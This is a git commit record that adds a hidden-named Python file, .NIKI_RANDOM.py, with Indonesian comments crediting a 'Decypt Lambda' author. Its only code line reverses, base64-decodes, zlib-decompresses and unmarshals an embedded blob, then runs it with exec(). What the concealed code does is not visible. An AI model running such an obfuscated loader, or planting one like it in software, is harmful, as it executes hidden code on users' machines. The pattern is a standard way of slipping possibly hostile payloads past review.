09c9f2bea76f3f698a1e95eab987ade4dba16b33
ArYan KhAn <105744869+innoxentAryan@users.noreply.github.com>
2022-08-05 18:49:47 +0500

    Create .NIKI_RANDOM.py

---
+++ .NIKI_RANDOM.py
@@ -0,0 +1,3 @@
+# Decypt Lambda By Aldi Bachtiar rifai
+# Makasih 70 subscribe
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'BszFUCAGFQMgvACj2laOlmS+5aDHbtrCba2LED8cgaiIGqE/jZR+1IStlsIdJfq6VG+Ul3BmiLuGizOWrjOVNgZ6RypHmve6cEZmZ6p5ZgREljpHV6R6s3eqYUBEQUl6ZI5lZWlEWku4QFRmmHuluLeWa5RFpnVbY6V6tjpnbWe5SGmXRIVGRoxkunVWcAmFqBRZpr2Hlbu4bge6YKhbh7emYYeGTp+4euFboYAupOZQYGThhEZkZGbmhWYMVGSliAkAFTMAsDEzDAkZLxJe'))
